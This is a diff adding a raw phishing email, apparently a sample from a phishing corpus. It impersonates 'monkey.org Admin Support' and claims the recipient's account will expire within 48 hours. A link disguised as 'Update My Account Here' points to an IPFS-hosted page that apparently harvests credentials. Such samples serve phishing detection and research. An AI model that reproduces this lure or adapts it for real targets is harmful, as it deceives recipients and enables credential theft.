@@ -1,0 +1,156 @@
+Return-Path: support@monkey.org
+Delivered-To: jose@monkey.org
+X-FDA: 80170853742.33.F3F44A3
+Received: from hp0.wx5.zxvn.live (unknown [165.22.230.2])
+	by imf08.b.hostedemail.com (Postfix) with ESMTP id CF1DC18070E0D
+	for <jose@monkey.org>; Fri, 25 Nov 2022 05:36:10 +0000 (UTC)
+From: monkey.org Support System <support@monkey.org>
+To: jose@monkey.org
+Subject: Identity Confirmation Request from monkey.org 
+Date: 24 Nov 2022 21:36:10 -0800
+Message-ID: <20221124213610.BEF098780CAE2644@monkey.org>
+MIME-Version: 1.0
+Content-Type: text/html;
+	charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
+ARC-Seal: i=1; s=arc-20220608; d=hostedemail.com; t=1669354570; a=rsa-sha256;
+	cv=none;
+	b=UnZmj8/krF31PTwi340AVzBqApTZbdl4TMDEkydMef22rdptmWzafq9zwAYrNbFp/ucpY7
+	yNMKrDp+EkmLmojhmIVumIYZZ2YWqDVaIy9982e8NF26r2TEVv6zsRZ6OpF/B0RLkjsevQ
+	4FhdZw4+DHvr9pUatO6D0saYe8KSu8g=
+ARC-Authentication-Results: i=1;	imf08.b.hostedemail.com;	dkim=none;
+	dmarc=none;	spf=softfail (imf08.b.hostedemail.com: 165.22.230.2 is neither
+ permitted nor denied by domain of support@monkey.org)
+ smtp.mailfrom=support@monkey.org
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed;
+ d=hostedemail.com;	s=arc-20220608; t=1669354570;
+	h=from:from:sender:reply-to:subject:subject:date:date:	
+ message-id:message-id:to:to:cc:mime-version:mime-version:	
+ content-type:content-type:	
+ content-transfer-encoding:content-transfer-encoding:in-reply-to:	 references;
+ bh=oTolxl1sJ1WfUHJrikmcbvxSrcmUFZsvCEcDEJw6/fA=;
+	b=N7rfd7fyCSi/UOLkt7LzBOp68XL65mj+bvDRagr0aYCykMDIPtXpylczyvqxjTbMmlgCKl
+	T8vNzRhLZtnLTC5MMxi9rg6QdJcsAnRGPyu3zdwtxn5tBj5n02/HSuJm62l4N94kCFwQax
+	JFknbUjJxUx0PT8oOIqYGRJgMmv9TWM=
+X-Spam-Status: Yes, score=10.60
+X-Stat-Signature: 8y6fzdtmtiq11taxahwkst6g5pz56zo6
+X-Rspamd-Queue-Id: CF1DC18070E0D
+Authentication-Results: imf08.b.hostedemail.com;	dkim=none;	dmarc=none;
+	spf=softfail (imf08.b.hostedemail.com: 165.22.230.2 is neither permitted nor
+ denied by domain of support@monkey.org) smtp.mailfrom=support@monkey.org
+X-Rspam-User: 
+X-Rspamd-Server: rspam08
+X-HE-Tag: 1669354570-277248
+Status: O
+X-Status: 
+X-Keywords: 
+X-UID: 220
+
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.=
+w3.org/TR/html4/loose.dtd">
+
+<HTML><HEAD>
+<META name=3DGENERATOR content=3D"MSHTML 11.00.10570.1001"></HEAD>
+<body style=3D"MARGIN: 0.5em">
+<P></P>
+<P></P>
+<P>
+<table style=3D"FONT-SIZE: 12px; MAX-WIDTH: 1024px; BORDER-TOP: rgb(211,211=
+,211) 1px dotted; FONT-FAMILY: Arial,Helvetica,sans-serif; BORDER-RIGHT: rg=
+b(211,211,211) 1px dotted; WIDTH: 598px; WHITE-SPACE: normal; WORD-SPACING:=
+ 0px; BORDER-BOTTOM: rgb(211,211,211) 1px dotted; TEXT-TRANSFORM: none; FON=
+T-WEIGHT: 400; COLOR: rgb(34,34,34); FONT-STYLE: normal; BORDER-SPACING: 0p=
+x; BORDER-LEFT: rgb(211,211,211) 1px dotted; MARGIN: 0px; LETTER-SPACING: n=
+ormal; BACKGROUND-COLOR: rgb(255,255,255);=20
+TEXT-INDENT: 0px; font-variant-ligatures: normal; font-variant-caps: normal=
+; text-decoration-style: initial; text-decoration-color: initial">
+<TBODY>
+<TR>
+<td style=3D"BORDER-TOP: rgb(223,225,230) 1px solid; FONT-FAMILY: Roboto,Ro=
+botoDraft,Helvetica,Arial,sans-serif; BORDER-RIGHT: rgb(223,225,230) 1px so=
+lid; BORDER-BOTTOM: rgb(223,225,230) 1px solid; OUTLINE-WIDTH: medium; PADD=
+ING-BOTTOM: 24px; PADDING-TOP: 24px; OUTLINE-STYLE: none; PADDING-LEFT: 24p=
+x; BORDER-LEFT: rgb(223,225,230) 1px solid; MARGIN: 0px; PADDING-RIGHT: 24p=
+x; border-radius: 3px">
+<P><FONT face=3D"georgia, serif"><FONT color=3D#eb6314 size=3D2></FONT></FO=
+NT></P>
+<H4><FONT face=3D"georgia, serif"><FONT color=3D#eb6314 size=3D2>
+<H6></H6>
+<H5></H5>
+<H2></H2>
+<H1><FONT color=3D#a020f0>monkey.org&nbsp; Admin Support!</FONT></H1></FONT=
+></FONT></H4><FONT face=3D"georgia, serif"><BR><BR>Dear&nbsp; jose ,</FONT>=
+<FONT face=3D"georgia, serif"><BR></FONT>
+<P></P>
+<P><FONT face=3D"georgia, serif">This is a second notification message sent=
+ from our database that your email account <BR>
+(jose@monkey.org) will expire within the next 48 hours and access to your a=
+ccount might be terminated.<BR style=3D"FONT-SIZE: 12px; FONT-FAMILY: Robot=
+o,RobotoDraft,Helvetica,Arial,sans-serif; WHITE-SPACE: normal; WORD-SPACING=
+: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(34,34,34); FONT-S=
+TYLE: normal; LETTER-SPACING: normal; BACKGROUND-COLOR: rgb(255,255,255); T=
+EXT-INDENT: 0px; font-variant-ligatures: normal; font-variant-caps: normal;=
+ text-decoration-style: initial; text-decoration-color:=20
+initial; border-radius: 0px"><BR style=3D"FONT-SIZE: 12px; FONT-FAMILY: Rob=
+oto,RobotoDraft,Helvetica,Arial,sans-serif; WHITE-SPACE: normal; WORD-SPACI=
+NG: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(34,34,34); FONT=
+-STYLE: normal; LETTER-SPACING: normal; BACKGROUND-COLOR: rgb(255,255,255);=
+ TEXT-INDENT: 0px; font-variant-ligatures: normal; font-variant-caps: norma=
+l; text-decoration-style: initial; text-decoration-color: initial; border-r=
+adius: 0px">
+<FONT style=3D"FONT-SIZE: 12px; WHITE-SPACE: normal; WORD-SPACING: 0px; TEX=
+T-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(34,34,34); FONT-STYLE: norm=
+al; LETTER-SPACING: normal; BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT=
+: 0px; font-variant-ligatures: normal; font-variant-caps: normal; text-deco=
+ration-style: initial; text-decoration-color: initial; border-radius: 0px" =
+face=3D"georgia, serif">
+<SPAN style=3D"FONT-SIZE: 12px; FONT-FAMILY: georgia,serif; WHITE-SPACE: no=
+rmal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb=
+(34,34,34); FONT-STYLE: normal; LETTER-SPACING: normal; TEXT-INDENT: 0px; f=
+ont-variant-ligatures: normal; font-variant-caps: normal; text-decoration-s=
+tyle: initial; text-decoration-color: initial; border-radius: 0px">To<SPAN =
+style=3D"border-radius: 0px"> </SPAN></SPAN><SPAN></SPAN>
+<SPAN style=3D"FONT-SIZE: 12px; FONT-FAMILY: georgia,serif; WHITE-SPACE: no=
+rmal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FLOAT: none; FONT-WEIGHT: 40=
+0; COLOR: rgb(34,34,34); FONT-STYLE: normal; DISPLAY: inline; LETTER-SPACIN=
+G: normal; BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT: 0px; font-varia=
+nt-ligatures: normal; font-variant-caps: normal; text-decoration-style: ini=
+tial; text-decoration-color: initial; border-radius: 0px">
+continue using your account&nbsp; jose@monkey.org, Kindly validate your ema=
+il now</SPAN>.<BR><BR><BR><BR>
+<A style=3D'FONT-SIZE: 15px; TEXT-DECORATION: none; FONT-FAMILY: "segoe ui =
+light"; BACKGROUND: rgb(38,112,236); COLOR: rgb(255,255,255); PADDING-BOTTO=
+M: 7px; PADDING-TOP: 7px; PADDING-LEFT: 7px; PADDING-RIGHT: 7px' href=3D"ht=
+tps://bafybeig3fefiyg7ola3l6edlml3zywiyntdkgxschss4erxrz6hvmus2ym.ipfs.w3s.=
+link/resultbo_gen374849.html#jose@monkey.org" rel=3D"nofollow noopener nore=
+ferrer" target=3D_blank=20
+data-saferedirecturl=3D"https://www.google.com/url?q=3Dhttps://bafybeic6dpq=
+vfixqbddimboyzxg4cb5dmqwmjgsqent355znbn6rfv6w64.ipfs.w3s.link/resultbox202_=
+cham-e.html%23%5B%5B-Email-%5D%5D&amp;source=3Dgmail&amp;ust=3D166943831492=
+7000&amp;usg=3DAOvVaw1P9YhPHaMGfobsVpoHXREI">Update My Account Here.</A><FO=
+NT face=3D"Segoe UI Light"> </FONT><BR></FONT></FONT><FONT size=3D3 face=3D=
+Arial><BR></FONT></P><FONT size=3D3 face=3DArial></FONT>
+<DIV id=3Dm_-1833918848527859045m_6773207201115384497m_2514517803418513986m=
+_-1173514277826505993m_4320199896876427834m_-1863834159200032373m_-56779602=
+53894096446gmail-x_gmail-m_-8853955079420497967x_gmail-x_AlertSeverityPart =
+style=3D'FONT-SIZE: 15px; FONT-FAMILY: wf_segoe-ui_normal,"Segoe UI","Segoe=
+ WP",Tahoma,Arial,sans-serif,serif,EmojiFont; COLOR: rgb(33,33,33)'><FONT s=
+ize=3D3 face=3DArial></FONT>
+<DIV><FONT face=3D"georgia, serif"><BR><BR>Thanks,<BR><BR><BR>monkey.org Ad=
+ministrator</FONT> </DIV></DIV>
+<P></P>
+<HR>
+<FONT face=3D"georgia, serif"><SPAN style=3D"COLOR: rgb(110,120,139)">This =
+email was sent to&nbsp; jose@monkey.org <FONT color=3D#222222></FONT></SPAN=
+></FONT><BR><FONT face=3D"georgia, serif"><SPAN style=3D"FONT-SIZE: 9px"><I=
+>Organization:&nbsp; monkey.org </I><I>Corporation. All rights reserved.</I=
+></SPAN> @ 2022</FONT></TD></TR>
+<TR>
+<td style=3D"BORDER-TOP: medium none; FONT-FAMILY: Roboto,RobotoDraft,Helve=
+tica,Arial,sans-serif; BORDER-RIGHT: medium none; BORDER-BOTTOM: medium non=
+e; OUTLINE-WIDTH: medium; PADDING-BOTTOM: 0px; PADDING-TOP: 18px; OUTLINE-S=
+TYLE: none; PADDING-LEFT: 0px; BORDER-LEFT: medium none; MARGIN: 0px; PADDI=
+NG-RIGHT: 0px">
+<DIV style=3D"MARGIN: 0px"></DIV><BR></TD></TR></TBODY></TABLE></P>
+<P><BR></P></BODY></HTML>
+
